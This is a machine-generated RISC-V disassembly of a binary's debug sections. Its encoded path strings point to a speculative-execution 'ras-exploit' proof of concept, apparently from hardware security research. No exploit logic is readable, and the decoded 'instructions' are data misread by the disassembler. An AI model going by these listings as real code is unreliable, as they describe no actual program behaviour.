    18a2:	0100                	.2byte	0x100
    18a4:	1d05                	.2byte	0x1d05
    18a6:	0200                	.2byte	0x200
    18a8:	0204                	.2byte	0x204
    18aa:	08090203          	lb	tp,128(s2)
    18ae:	0100                	.2byte	0x100
    18b0:	1705                	.2byte	0x1705
    18b2:	0200                	.2byte	0x200
    18b4:	0204                	.2byte	0x204
    18b6:	0c090003          	lb	zero,192(s2)
    18ba:	0100                	.2byte	0x100
    18bc:	0d05                	.2byte	0xd05
    18be:	0200                	.2byte	0x200
    18c0:	0204                	.2byte	0x204
    18c2:	14090103          	lb	sp,320(s2)
    18c6:	0100                	.2byte	0x100
    18c8:	2505                	.2byte	0x2505
    18ca:	0200                	.2byte	0x200
    18cc:	0204                	.2byte	0x204
    18ce:	28097603          	.4byte	0x28097603
    18d2:	0100                	.2byte	0x100
    18d4:	1b05                	.2byte	0x1b05
    18d6:	0200                	.2byte	0x200
    18d8:	0104                	.2byte	0x104
    18da:	0c090003          	lb	zero,192(s2)
    18de:	0100                	.2byte	0x100
    18e0:	0d05                	.2byte	0xd05
    18e2:	10090d03          	lb	s10,256(s2)
    18e6:	0100                	.2byte	0x100
    18e8:	1205                	.2byte	0x1205
    18ea:	04090103          	lb	sp,64(s2)
    18ee:	0100                	.2byte	0x100
    18f0:	0905                	.2byte	0x905
    18f2:	04090003          	lb	zero,64(s2)
    18f6:	0100                	.2byte	0x100
    18f8:	1705                	.2byte	0x1705
    18fa:	04090103          	lb	sp,64(s2)
    18fe:	0100                	.2byte	0x100
    1900:	1005                	.2byte	0x1005
    1902:	14090003          	lb	zero,320(s2)
    1906:	0100                	.2byte	0x100
    1908:	1405                	.2byte	0x1405
    190a:	08090103          	lb	sp,128(s2)
    190e:	0100                	.2byte	0x100
    1910:	2505                	.2byte	0x2505
    1912:	0200                	.2byte	0x200
    1914:	0204                	.2byte	0x204
    1916:	0c097e03          	.4byte	0xc097e03
    191a:	0100                	.2byte	0x100
    191c:	1b05                	.2byte	0x1b05
    191e:	0200                	.2byte	0x200
    1920:	0104                	.2byte	0x104
    1922:	0c090003          	lb	zero,192(s2)
    1926:	0100                	.2byte	0x100
    1928:	2705                	.2byte	0x2705
    192a:	10090503          	lb	a0,256(s2)
    192e:	0100                	.2byte	0x100
    1930:	1305                	.2byte	0x1305
    1932:	18090003          	lb	zero,384(s2)
    1936:	0100                	.2byte	0x100
    1938:	1405                	.2byte	0x1405
    193a:	10090103          	lb	sp,256(s2)
    193e:	0100                	.2byte	0x100
    1940:	3205                	.2byte	0x3205
    1942:	0200                	.2byte	0x200
    1944:	0104                	.2byte	0x104
    1946:	10090003          	lb	zero,256(s2)
    194a:	0100                	.2byte	0x100
    194c:	1405                	.2byte	0x1405
    194e:	0200                	.2byte	0x200
    1950:	0104                	.2byte	0x104
    1952:	08090003          	lb	zero,128(s2)
    1956:	0100                	.2byte	0x100
    1958:	0200                	.2byte	0x200
    195a:	0204                	.2byte	0x204
    195c:	0306                	.2byte	0x306
    195e:	0900                	.2byte	0x900
    1960:	0010                	.2byte	0x10
    1962:	0001                	.2byte	0x1
    1964:	0402                	.2byte	0x402
    1966:	0304                	.2byte	0x304
    1968:	0900                	.2byte	0x900
    196a:	0008                	.2byte	0x8
    196c:	0501                	.2byte	0x501
    196e:	0029                	.2byte	0x29
    1970:	0402                	.2byte	0x402
    1972:	0604                	.2byte	0x604
    1974:	10090203          	lb	tp,256(s2)
    1978:	0100                	.2byte	0x100
    197a:	0905                	.2byte	0x905
    197c:	0200                	.2byte	0x200
    197e:	0404                	.2byte	0x404
    1980:	10090003          	lb	zero,256(s2)
    1984:	0100                	.2byte	0x100
    1986:	3505                	.2byte	0x3505
    1988:	0200                	.2byte	0x200
    198a:	0404                	.2byte	0x404
    198c:	04090003          	lb	zero,64(s2)
    1990:	0100                	.2byte	0x100
    1992:	0905                	.2byte	0x905
    1994:	0200                	.2byte	0x200
    1996:	0404                	.2byte	0x404
    1998:	10090003          	lb	zero,256(s2)
    199c:	0100                	.2byte	0x100
    199e:	2d05                	.2byte	0x2d05
    19a0:	0200                	.2byte	0x200
    19a2:	0404                	.2byte	0x404
    19a4:	20096703          	lwu	a4,512(s2)
    19a8:	0100                	.2byte	0x100
    19aa:	2405                	.2byte	0x2405
    19ac:	0200                	.2byte	0x200
    19ae:	0204                	.2byte	0x204
    19b0:	0c090003          	lb	zero,192(s2)
    19b4:	0100                	.2byte	0x100
    19b6:	0e05                	.2byte	0xe05
    19b8:	0c092303          	lw	t1,192(s2)
    19bc:	0100                	.2byte	0x100
    19be:	08090103          	lb	sp,128(s2)
    19c2:	0100                	.2byte	0x100
    19c4:	0d05                	.2byte	0xd05
    19c6:	0c090103          	lb	sp,192(s2)
    19ca:	0100                	.2byte	0x100
    19cc:	1305                	.2byte	0x1305
    19ce:	04090103          	lb	sp,64(s2)
    19d2:	0100                	.2byte	0x100
    19d4:	0505                	.2byte	0x505
    19d6:	0c090103          	lb	sp,192(s2)
    19da:	0100                	.2byte	0x100
    19dc:	1305                	.2byte	0x1305
    19de:	04090103          	lb	sp,64(s2)
    19e2:	0100                	.2byte	0x100
    19e4:	0c05                	.2byte	0xc05
    19e6:	08090203          	lb	tp,128(s2)
    19ea:	0100                	.2byte	0x100
    19ec:	0105                	.2byte	0x105
    19ee:	04090103          	lb	sp,64(s2)
    19f2:	0100                	.2byte	0x100
    19f4:	1409                	.2byte	0x1409
    19f6:	0000                	.2byte	0x0
    19f8:	0101                	.2byte	0x101

Disassembly of section .debug_line_str:

0000000000000000 <.debug_line_str>:
   0:	746e6d2f          	.4byte	0x746e6d2f
   4:	6c696d2f          	.4byte	0x6c696d2f
   8:	7365                	.2byte	0x7365
   a:	6e61                	.2byte	0x6e61
   c:	6d2d                	.2byte	0x6d2d
   e:	7465                	.2byte	0x7465
  10:	2f61                	.2byte	0x2f61
  12:	6f70                	.2byte	0x6f70
  14:	732f7363          	bgeu	t5,s2,73a <threadsense.2+0x6b6>
  18:	6570                	.2byte	0x6570
  1a:	636f6463          	bltu	t5,s6,642 <threadsense.2+0x5be>
  1e:	6f74                	.2byte	0x6f74
  20:	2f72                	.2byte	0x2f72
  22:	6172                	.2byte	0x6172
  24:	74612d73          	csrrs	s10,0x746,sp
  28:	6174                	.2byte	0x6174
  2a:	542f6b63          	bltu	t5,sp,580 <threadsense.2+0x4fc>
  2e:	6d65                	.2byte	0x6d65
  30:	6c70                	.2byte	0x6c70
  32:	7461                	.2byte	0x7461
  34:	0065                	.2byte	0x65
  36:	00637273          	csrrc	tp,0x6,6
  3a:	6e65                	.2byte	0x6e65
  3c:	7274                	.2byte	0x7274
  3e:	2e79                	.2byte	0x2e79
  40:	72730053          	.4byte	0x72730053
  44:	6d702f63          	.4byte	0x6d702f63
  48:	2e70                	.2byte	0x2e70
  4a:	722f0063          	beq	t5,sp,76a <threadsense.2+0x6e6>
  4e:	2f746f6f          	jal	t5,46b44 <threadsense.2+0x46ac0>
  52:	7270                	.2byte	0x7270
  54:	6665                	.2byte	0x6665
  56:	7869                	.2byte	0x7869
  58:	6d2d                	.2byte	0x6d2d
  5a:	6c69                	.2byte	0x6c69
  5c:	7365                	.2byte	0x7365
  5e:	6e61                	.2byte	0x6e61
  60:	7369722f          	.4byte	0x7369722f
  64:	722f7663          	bgeu	t5,sp,790 <threadsense.2+0x70c>
  68:	7369                	.2byte	0x7369
  6a:	34367663          	bgeu	a2,gp,3b6 <threadsense.2+0x332>
  6e:	752d                	.2byte	0x752d
  70:	6b6e                	.2byte	0x6b6e
  72:	6f6e                	.2byte	0x6f6e
  74:	652d6e77          	.4byte	0x652d6e77
  78:	666c                	.2byte	0x666c
  7a:	636e692f          	.4byte	0x636e692f
  7e:	756c                	.2byte	0x756c
  80:	6564                	.2byte	0x6564
  82:	63616d2f          	.4byte	0x63616d2f
  86:	6968                	.2byte	0x6968
  88:	656e                	.2byte	0x656e
  8a:	2f00                	.2byte	0x2f00
  8c:	6f72                	.2byte	0x6f72
  8e:	702f746f          	jal	s0,f7790 <threadsense.2+0xf770c>
  92:	6572                	.2byte	0x6572
  94:	6966                	.2byte	0x6966
  96:	2d78                	.2byte	0x2d78
  98:	696d                	.2byte	0x696d
  9a:	656c                	.2byte	0x656c
  9c:	2f6e6173          	csrrs	sp,0x2f6,28
  a0:	6972                	.2byte	0x6972
  a2:	2f766373          	csrrs	t1,0x2f7,12
  a6:	6972                	.2byte	0x6972
  a8:	36766373          	csrrs	t1,0x367,12
  ac:	2d34                	.2byte	0x2d34
  ae:	6e75                	.2byte	0x6e75
  b0:	776f6e6b          	.4byte	0x776f6e6b
  b4:	2d6e                	.2byte	0x2d6e
  b6:	6c65                	.2byte	0x6c65
  b8:	2f66                	.2byte	0x2f66
  ba:	6e69                	.2byte	0x6e69
  bc:	64756c63          	bltu	a0,t2,714 <threadsense.2+0x690>
  c0:	2f65                	.2byte	0x2f65
  c2:	00737973          	csrrc	s2,0x7,6
  c6:	645f 6665 7561      	.byte	0x5f, 0x64, 0x65, 0x66, 0x61, 0x75
  cc:	746c                	.2byte	0x746c
  ce:	745f 7079 7365      	.byte	0x5f, 0x74, 0x79, 0x70, 0x65, 0x73
  d4:	682e                	.2byte	0x682e
  d6:	5f00                	.2byte	0x5f00
  d8:	69647473          	csrrc	s0,0x696,8
  dc:	746e                	.2byte	0x746e
  de:	682e                	.2byte	0x682e
  e0:	7300                	.2byte	0x7300
  e2:	6372                	.2byte	0x6372
  e4:	7379732f          	.4byte	0x7379732f
  e8:	6c6c6163          	bltu	s8,t1,7aa <threadsense.2+0x726>
  ec:	00632e73          	csrrs	t3,0x6,t1
  f0:	6e69                	.2byte	0x6e69
  f2:	722f0063          	beq	t5,sp,812 <threadsense.2+0x78e>
  f6:	2f746f6f          	jal	t5,46bec <threadsense.2+0x46b68>
  fa:	7270                	.2byte	0x7270
  fc:	6665                	.2byte	0x6665
  fe:	7869                	.2byte	0x7869
 100:	6d2d                	.2byte	0x6d2d
 102:	6c69                	.2byte	0x6c69
 104:	7365                	.2byte	0x7365
 106:	6e61                	.2byte	0x6e61
 108:	7369722f          	.4byte	0x7369722f
 10c:	722f7663          	bgeu	t5,sp,838 <threadsense.2+0x7b4>
 110:	7369                	.2byte	0x7369
 112:	34367663          	bgeu	a2,gp,45e <threadsense.2+0x3da>
 116:	752d                	.2byte	0x752d
 118:	6b6e                	.2byte	0x6b6e
 11a:	6f6e                	.2byte	0x6f6e
 11c:	652d6e77          	.4byte	0x652d6e77
 120:	666c                	.2byte	0x666c
 122:	636e692f          	.4byte	0x636e692f
 126:	756c                	.2byte	0x756c
 128:	6564                	.2byte	0x6564
 12a:	2f00                	.2byte	0x2f00
 12c:	6f72                	.2byte	0x6f72
 12e:	702f746f          	jal	s0,f7830 <threadsense.2+0xf77ac>
 132:	6572                	.2byte	0x6572
 134:	6966                	.2byte	0x6966
 136:	2d78                	.2byte	0x2d78
 138:	696d                	.2byte	0x696d
 13a:	656c                	.2byte	0x656c
 13c:	2f6e6173          	csrrs	sp,0x2f6,28
 140:	6972                	.2byte	0x6972
 142:	2f766373          	csrrs	t1,0x2f7,12
 146:	696c                	.2byte	0x696c
 148:	2f62                	.2byte	0x2f62
 14a:	2f636367          	.4byte	0x2f636367
 14e:	6972                	.2byte	0x6972
 150:	36766373          	csrrs	t1,0x367,12
 154:	2d34                	.2byte	0x2d34
 156:	6e75                	.2byte	0x6e75
 158:	776f6e6b          	.4byte	0x776f6e6b
 15c:	2d6e                	.2byte	0x2d6e
 15e:	6c65                	.2byte	0x6c65
 160:	2f66                	.2byte	0x2f66
 162:	3231                	.2byte	0x3231
 164:	322e                	.2byte	0x322e
 166:	302e                	.2byte	0x302e
 168:	636e692f          	.4byte	0x636e692f
 16c:	756c                	.2byte	0x756c
 16e:	6564                	.2byte	0x6564
 170:	7500                	.2byte	0x7500
 172:	6974                	.2byte	0x6974
 174:	2e6c                	.2byte	0x2e6c
 176:	0068                	.2byte	0x68
 178:	69647473          	csrrc	s0,0x696,8
 17c:	00682e6f          	jal	t3,82182 <threadsense.2+0x820fe>
 180:	64647473          	csrrc	s0,hviprio1,8
 184:	6665                	.2byte	0x6665
 186:	682e                	.2byte	0x682e
 188:	7300                	.2byte	0x7300
 18a:	6474                	.2byte	0x6474
 18c:	7261                	.2byte	0x7261
 18e:	00682e67          	.4byte	0x682e67
 192:	69727473          	csrrc	s0,0x697,4
 196:	676e                	.2byte	0x676e
 198:	682e                	.2byte	0x682e
 19a:	7300                	.2byte	0x7300
 19c:	6372                	.2byte	0x6372
 19e:	2e6d762f          	.4byte	0x2e6d762f
 1a2:	6d760063          	beq	a2,s7,862 <threadsense.2+0x7de>
 1a6:	682e                	.2byte	0x682e
 1a8:	2f00                	.2byte	0x2f00
 1aa:	6e6d                	.2byte	0x6e6d
 1ac:	2f74                	.2byte	0x2f74
 1ae:	696d                	.2byte	0x696d
 1b0:	656c                	.2byte	0x656c
 1b2:	2d6e6173          	csrrs	sp,0x2d6,28
 1b6:	656d                	.2byte	0x656d
 1b8:	6174                	.2byte	0x6174
 1ba:	636f702f          	.4byte	0x636f702f
 1be:	70732f73          	csrrs	t5,0x707,t1
 1c2:	6365                	.2byte	0x6365
 1c4:	6f64                	.2byte	0x6f64
 1c6:	726f7463          	bgeu	t5,t1,8ee <threadsense.2+0x86a>
 1ca:	7361722f          	.4byte	0x7361722f
 1ce:	612d                	.2byte	0x612d
 1d0:	7474                	.2byte	0x7474
 1d2:	6361                	.2byte	0x6361
 1d4:	65542f6b          	.4byte	0x65542f6b
 1d8:	706d                	.2byte	0x706d
 1da:	616c                	.2byte	0x616c
 1dc:	6574                	.2byte	0x6574
 1de:	7361722f          	.4byte	0x7361722f
 1e2:	652d                	.2byte	0x652d
 1e4:	7078                	.2byte	0x7078
 1e6:	6f6c                	.2byte	0x6f6c
 1e8:	7469                	.2byte	0x7469
 1ea:	632e                	.2byte	0x632e
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	001f 0000 0005      	.byte	0x1f, 0x00, 0x00, 0x00, 0x05, 0x00
       6:	0801                	.2byte	0x801
       8:	0000                	.2byte	0x0
       a:	0000                	.2byte	0x0
       c:	0001                	.2byte	0x1
       e:	0000                	.2byte	0x0
      10:	0c00                	.2byte	0xc00
      12:	0000                	.2byte	0x0
      14:	0000                	.2byte	0x0
      16:	0000                	.2byte	0x0
      18:	0c00                	.2byte	0xc00
      1a:	0000                	.2byte	0x0
      1c:	4200                	.2byte	0x4200
      1e:	0000                	.2byte	0x0
      20:	0100                	.2byte	0x100
      22:	b080                	.2byte	0xb080
      24:	0000                	.2byte	0x0
      26:	0500                	.2byte	0x500
      28:	0100                	.2byte	0x100
      2a:	1208                	.2byte	0x1208
      2c:	0000                	.2byte	0x0
      2e:	0400                	.2byte	0x400
      30:	0079                	.2byte	0x79
      32:	0000                	.2byte	0x0
      34:	420c                	.2byte	0x420c
      36:	0000                	.2byte	0x0
      38:	0000                	.2byte	0x0
      3a:	0000                	.2byte	0x0
      3c:	4800                	.2byte	0x4800
      3e:	0010                	.2byte	0x10
      40:	0080                	.2byte	0x80
      42:	0000                	.2byte	0x0
      44:	5800                	.2byte	0x5800
      46:	0000                	.2byte	0x0
      48:	0000                	.2byte	0x0
      4a:	0000                	.2byte	0x0
      4c:	c100                	.2byte	0xc100
      4e:	0002                	.2byte	0x2
      50:	0100                	.2byte	0x100
      52:	0601                	.2byte	0x601
      54:	00000123          	sb	zero,2(zero) # 2 <threadsense.5+0x2>
      58:	0101                	.2byte	0x101
      5a:	2108                	.2byte	0x2108
      5c:	0001                	.2byte	0x1
      5e:	0100                	.2byte	0x100
      60:	0502                	.2byte	0x502
      62:	00000117          	auipc	sp,0x0
      66:	0201                	.2byte	0x201
      68:	00006607          	.4byte	0x6607
      6c:	0500                	.2byte	0x500
      6e:	0504                	.2byte	0x504
      70:	6e69                	.2byte	0x6e69
      72:	0074                	.2byte	0x74
      74:	0401                	.2byte	0x401
      76:	00027707          	.4byte	0x27707
      7a:	0100                	.2byte	0x100
      7c:	0508                	.2byte	0x508
      7e:	01fc                	.2byte	0x1fc
      80:	0000                	.2byte	0x0
      82:	0801                	.2byte	0x801
      84:	00027207          	.4byte	0x27207
      88:	0200                	.2byte	0x200
      8a:	005a                	.2byte	0x5a
      8c:	0000                	.2byte	0x0
      8e:	e802                	.2byte	0xe802
      90:	5f1a                	.2byte	0x5f1a
      92:	0000                	.2byte	0x0
      94:	0200                	.2byte	0x200
      96:	005c                	.2byte	0x5c
      98:	0000                	.2byte	0x0
      9a:	66155203          	lhu	tp,1633(a0)
      9e:	0000                	.2byte	0x0
      a0:	0600                	.2byte	0x600
      a2:	0000012f          	.4byte	0x12f
      a6:	0a01                	.2byte	0xa01
      a8:	4806                	.2byte	0x4806
      aa:	0010                	.2byte	0x10
      ac:	0080                	.2byte	0x80
      ae:	0000                	.2byte	0x0
      b0:	5800                	.2byte	0x5800
      b2:	0000                	.2byte	0x0
      b4:	0000                	.2byte	0x0
      b6:	0000                	.2byte	0x0
      b8:	0100                	.2byte	0x100
      ba:	039c                	.2byte	0x39c
      bc:	0050                	.2byte	0x50
      be:	0000                	.2byte	0x0
      c0:	720c                	.2byte	0x720c
      c2:	0000                	.2byte	0x0
      c4:	0200                	.2byte	0x200
      c6:	6891                	.2byte	0x6891
      c8:	00005503          	lhu	a0,0(zero) # 0 <threadsense.5>
      cc:	0d00                	.2byte	0xd00
      ce:	0072                	.2byte	0x72
      d0:	0000                	.2byte	0x0
      d2:	9102                	.2byte	0x9102
      d4:	0060                	.2byte	0x60
      d6:	9200                	.2byte	0x9200
      d8:	000c                	.2byte	0xc
      da:	0500                	.2byte	0x500
      dc:	0100                	.2byte	0x100
      de:	7508                	.2byte	0x7508
      e0:	0000                	.2byte	0x0
      e2:	1e00                	.2byte	0x1e00
      e4:	0079                	.2byte	0x79
      e6:	0000                	.2byte	0x0
      e8:	e10c                	.2byte	0xe10c
      ea:	0000                	.2byte	0x0
      ec:	0000                	.2byte	0x0
      ee:	0000                	.2byte	0x0
      f0:	a000                	.2byte	0xa000
      f2:	0010                	.2byte	0x10
      f4:	0080                	.2byte	0x80
      f6:	0000                	.2byte	0x0
      f8:	6c00                	.2byte	0x6c00
      fa:	0014                	.2byte	0x14
      fc:	0000                	.2byte	0x0
      fe:	0000                	.2byte	0x0
     100:	4700                	.2byte	0x4700
     102:	07000003          	lb	zero,112(zero) # 70 <buf.4+0x30>
     106:	0601                	.2byte	0x601
     108:	00000123          	sb	zero,2(zero) # 2 <threadsense.5+0x2>
     10c:	21080107          	.4byte	0x21080107
     110:	0001                	.2byte	0x1
     112:	0700                	.2byte	0x700
     114:	0502                	.2byte	0x502
     116:	00000117          	auipc	sp,0x0
     11a:	66070207          	.4byte	0x66070207
     11e:	0000                	.2byte	0x0
     120:	1f00                	.2byte	0x1f00
     122:	0504                	.2byte	0x504
     124:	6e69                	.2byte	0x6e69
     126:	0074                	.2byte	0x74
     128:	4a0e                	.2byte	0x4a0e
     12a:	0000                	.2byte	0x0
     12c:	0c00                	.2byte	0xc00
     12e:	0051                	.2byte	0x51
     130:	0000                	.2byte	0x0
     132:	4a0c                	.2byte	0x4a0c
     134:	0000                	.2byte	0x0
     136:	0700                	.2byte	0x700
     138:	0704                	.2byte	0x704
     13a:	00000277          	.4byte	0x277
     13e:	fc050807          	.4byte	0xfc050807
     142:	0001                	.2byte	0x1
     144:	0900                	.2byte	0x900
     146:	000002c3          	fmadd.s	ft5,ft0,ft0,ft0,rne
     14a:	6904                	.2byte	0x6904
     14c:	7a19                	.2byte	0x7a19
     14e:	0000                	.2byte	0x0
     150:	0700                	.2byte	0x700
     152:	0708                	.2byte	0x708
     154:	0272                	.2byte	0x272
     156:	0000                	.2byte	0x0
     158:	5a09                	.2byte	0x5a09
     15a:	0000                	.2byte	0x0
     15c:	0400                	.2byte	0x400
     15e:	1ae8                	.2byte	0x1ae8
     160:	007a                	.2byte	0x7a
     162:	0000                	.2byte	0x0
     164:	c509                	.2byte	0xc509
     166:	0002                	.2byte	0x2
     168:	0500                	.2byte	0x500
     16a:	143c                	.2byte	0x143c
     16c:	006e                	.2byte	0x6e
     16e:	0000                	.2byte	0x0
     170:	8d0e                	.2byte	0x8d0e
     172:	0000                	.2byte	0x0
     174:	0900                	.2byte	0x900
     176:	005c                	.2byte	0x5c
     178:	0000                	.2byte	0x0
     17a:	5205                	.2byte	0x5205
     17c:	8115                	.2byte	0x8115
     17e:	0000                	.2byte	0x0
     180:	0c00                	.2byte	0xc00
     182:	009e                	.2byte	0x9e
     184:	0000                	.2byte	0x0
     186:	6e09                	.2byte	0x6e09
     188:	0001                	.2byte	0x1
     18a:	0600                	.2byte	0x600
     18c:	17d6                	.2byte	0x17d6
     18e:	007a                	.2byte	0x7a
     190:	0000                	.2byte	0x0
     192:	f7050807          	.4byte	0xf7050807
     196:	0001                	.2byte	0x1
     198:	2000                	.2byte	0x2000
     19a:	2108                	.2byte	0x2108
     19c:	da08                	.2byte	0xda08
     19e:	0002                	.2byte	0x2
     1a0:	0600                	.2byte	0x600
     1a2:	000000cf          	fnmadd.s	ft1,ft0,ft0,ft0,rne
     1a6:	2a080107          	.4byte	0x2a080107
     1aa:	0001                	.2byte	0x1
     1ac:	0c00                	.2byte	0xc00
     1ae:	000000cf          	fnmadd.s	ft1,ft0,ft0,ft0,rne
     1b2:	d606                	.2byte	0xd606
     1b4:	0000                	.2byte	0x0
     1b6:	0700                	.2byte	0x700
     1b8:	0708                	.2byte	0x708
     1ba:	026d                	.2byte	0x26d
     1bc:	0000                	.2byte	0x0
     1be:	1909                	.2byte	0x1909
     1c0:	0002                	.2byte	0x2
     1c2:	0700                	.2byte	0x700
     1c4:	1b28                	.2byte	0x1b28
     1c6:	00c4                	.2byte	0xc4
     1c8:	0000                	.2byte	0x0
     1ca:	2009                	.2byte	0x2009
     1cc:	0002                	.2byte	0x2
     1ce:	0700                	.2byte	0x700
     1d0:	00e71863          	bne	a4,a4,1e0 <threadsense.2+0x15c>
     1d4:	0000                	.2byte	0x0
     1d6:	4d14                	.2byte	0x4d14
     1d8:	0f000003          	lb	zero,240(zero) # f0 <threadsense.2+0x6c>
     1dc:	0099                	.2byte	0x99
     1de:	0000                	.2byte	0x0
     1e0:	0f14                	.2byte	0xf14
     1e2:	10000003          	lb	zero,256(zero) # 100 <threadsense.2+0x7c>
     1e6:	0099                	.2byte	0x99
     1e8:	0000                	.2byte	0x0
     1ea:	4c22                	.2byte	0x4c22
     1ec:	0002                	.2byte	0x2
     1ee:	0200                	.2byte	0x200
     1f0:	0192                	.2byte	0x192
     1f2:	6706                	.2byte	0x6706
     1f4:	0000                	.2byte	0x0
     1f6:	fc00                	.2byte	0xfc00
     1f8:	00800023          	sb	s0,0(zero) # 0 <threadsense.5>
     1fc:	0000                	.2byte	0x0
     1fe:	1000                	.2byte	0x1000
     200:	0001                	.2byte	0x1
     202:	0000                	.2byte	0x0
     204:	0000                	.2byte	0x0
     206:	0100                	.2byte	0x100
     208:	649c                	.2byte	0x649c
     20a:	0001                	.2byte	0x1
     20c:	0400                	.2byte	0x400
     20e:	00727473          	csrrc	s0,0x7,4
     212:	0192                	.2byte	0x192
     214:	0000db17          	auipc	s6,0xd
     218:	0200                	.2byte	0x200
     21a:	5891                	.2byte	0x5891
     21c:	7205                	.2byte	0x7205
     21e:	7365                	.2byte	0x7365
     220:	9400                	.2byte	0x9400
     222:	0801                	.2byte	0x801
     224:	00000067          	jr	zero # 0 <threadsense.5>
     228:	9102                	.2byte	0x9102
     22a:	0f68                	.2byte	0xf68
     22c:	02ec                	.2byte	0x2ec
     22e:	0000                	.2byte	0x0
     230:	0195                	.2byte	0x195
     232:	00004a07          	.4byte	0x4a07
     236:	0200                	.2byte	0x200
     238:	6491                	.2byte	0x6491
     23a:	0b00                	.2byte	0xb00
     23c:	000002b3          	add	t0,zero,zero
     240:	0826                	.2byte	0x826
     242:	00ca                	.2byte	0xca
     244:	0000                	.2byte	0x0
     246:	23a0                	.2byte	0x23a0
     248:	8000                	.2byte	0x8000
     24a:	0000                	.2byte	0x0
     24c:	0000                	.2byte	0x0
     24e:	005c                	.2byte	0x5c
     250:	0000                	.2byte	0x0
     252:	0000                	.2byte	0x0
     254:	0000                	.2byte	0x0
     256:	9c01                	.2byte	0x9c01
     258:	01b1                	.2byte	0x1b1
     25a:	0000                	.2byte	0x0
     25c:	ff0d                	.2byte	0xff0d
     25e:	0002                	.2byte	0x2
     260:	8a00                	.2byte	0x8a00
     262:	1401                	.2byte	0x1401
     264:	00ca                	.2byte	0xca
     266:	0000                	.2byte	0x0
     268:	9102                	.2byte	0x9102
     26a:	0458                	.2byte	0x458
     26c:	00637273          	csrrc	tp,0x6,6
     270:	018a                	.2byte	0x18a
     272:	db26                	.2byte	0xdb26
     274:	0000                	.2byte	0x0
     276:	0200                	.2byte	0x200
     278:	5091                	.2byte	0x5091
     27a:	6405                	.2byte	0x6405
     27c:	8c00                	.2byte	0x8c00
     27e:	0901                	.2byte	0x901
     280:	00ca                	.2byte	0xca
     282:	0000                	.2byte	0x0
     284:	9102                	.2byte	0x9102
     286:	0068                	.2byte	0x68
     288:	0003200b          	.4byte	0x3200b
     28c:	2400                	.2byte	0x2400
     28e:	4a06                	.2byte	0x4a06
     290:	0000                	.2byte	0x0
     292:	1800                	.2byte	0x1800
     294:	00800023          	sb	s0,0(zero) # 0 <threadsense.5>
     298:	0000                	.2byte	0x0
     29a:	8800                	.2byte	0x8800
     29c:	0000                	.2byte	0x0
     29e:	0000                	.2byte	0x0
     2a0:	0000                	.2byte	0x0
     2a2:	0100                	.2byte	0x100
     2a4:	0b9c                	.2byte	0xb9c
     2a6:	0002                	.2byte	0x2
     2a8:	0400                	.2byte	0x400
     2aa:	7e003173          	csrrc	sp,0x7e0,zero
     2ae:	1801                	.2byte	0x1801
     2b0:	000000db          	.4byte	0xdb
     2b4:	9102                	.2byte	0x9102
     2b6:	0458                	.2byte	0x458
     2b8:	7e003273          	csrrc	tp,0x7e0,zero
     2bc:	2801                	.2byte	0x2801
     2be:	000000db          	.4byte	0xdb
     2c2:	9102                	.2byte	0x9102
     2c4:	0550                	.2byte	0x550
     2c6:	80003163          	.4byte	0x80003163
     2ca:	1101                	.2byte	0x1101
     2cc:	0035                	.2byte	0x35
     2ce:	0000                	.2byte	0x0
     2d0:	9102                	.2byte	0x9102
     2d2:	3263056f          	jal	a0,305f8 <threadsense.2+0x30574>
     2d6:	8000                	.2byte	0x8000
     2d8:	1501                	.2byte	0x1501
     2da:	0035                	.2byte	0x35
     2dc:	0000                	.2byte	0x0
     2de:	9102                	.2byte	0x9102
     2e0:	006e                	.2byte	0x6e
     2e2:	0001380b          	.4byte	0x1380b
     2e6:	7700                	.2byte	0x7700
     2e8:	af09                	.2byte	0xaf09
     2ea:	0000                	.2byte	0x0
     2ec:	b400                	.2byte	0xb400
     2ee:	0022                	.2byte	0x22
     2f0:	0080                	.2byte	0x80
     2f2:	0000                	.2byte	0x0
     2f4:	6400                	.2byte	0x6400
     2f6:	0000                	.2byte	0x0
     2f8:	0000                	.2byte	0x0
     2fa:	0000                	.2byte	0x0
     2fc:	0100                	.2byte	0x100
     2fe:	549c                	.2byte	0x549c
     300:	0002                	.2byte	0x2
     302:	0400                	.2byte	0x400
     304:	01760073          	.4byte	0x1760073
     308:	db1c                	.2byte	0xdb1c
     30a:	0000                	.2byte	0x0
     30c:	0200                	.2byte	0x200
     30e:	5891                	.2byte	0x5891
     310:	6e04                	.2byte	0x6e04
     312:	7600                	.2byte	0x7600
     314:	2601                	.2byte	0x2601
     316:	000000af          	.4byte	0xaf
     31a:	9102                	.2byte	0x9102
     31c:	0550                	.2byte	0x550
     31e:	0070                	.2byte	0x70
     320:	0178                	.2byte	0x178
     322:	0000db0f          	.4byte	0xdb0f
     326:	0200                	.2byte	0x200
     328:	6891                	.2byte	0x6891
     32a:	0b00                	.2byte	0xb00
     32c:	02ac                	.2byte	0x2ac
     32e:	0000                	.2byte	0x0
     330:	0929                	.2byte	0x929
     332:	000000af          	.4byte	0xaf
     336:	2264                	.2byte	0x2264
     338:	8000                	.2byte	0x8000
     33a:	0000                	.2byte	0x0
     33c:	0000                	.2byte	0x0
     33e:	0050                	.2byte	0x50
     340:	0000                	.2byte	0x0
     342:	0000                	.2byte	0x0
     344:	0000                	.2byte	0x0
     346:	9c01                	.2byte	0x9c01
     348:	0290                	.2byte	0x290
     34a:	0000                	.2byte	0x0
     34c:	7304                	.2byte	0x7304
     34e:	6e00                	.2byte	0x6e00
     350:	1b01                	.2byte	0x1b01
     352:	000000db          	.4byte	0xdb
     356:	9102                	.2byte	0x9102
     358:	0558                	.2byte	0x558
     35a:	0070                	.2byte	0x70
     35c:	0170                	.2byte	0x170
     35e:	0000db0f          	.4byte	0xdb0f
     362:	0200                	.2byte	0x200
     364:	6891                	.2byte	0x6891
     366:	0b00                	.2byte	0xb00
     368:	020a                	.2byte	0x20a
     36a:	0000                	.2byte	0x0
     36c:	0921                	.2byte	0x921
     36e:	00c2                	.2byte	0xc2
     370:	0000                	.2byte	0x0
     372:	2168                	.2byte	0x2168
     374:	8000                	.2byte	0x8000
     376:	0000                	.2byte	0x0
     378:	0000                	.2byte	0x0
     37a:	00fc                	.2byte	0xfc
     37c:	0000                	.2byte	0x0
     37e:	0000                	.2byte	0x0
     380:	0000                	.2byte	0x0
     382:	9c01                	.2byte	0x9c01
     384:	0331                	.2byte	0x331
     386:	0000                	.2byte	0x0
     388:	ff0d                	.2byte	0xff0d
     38a:	0002                	.2byte	0x2
     38c:	5b00                	.2byte	0x5b00
     38e:	1401                	.2byte	0x1401
     390:	00c2                	.2byte	0xc2
     392:	0000                	.2byte	0x0
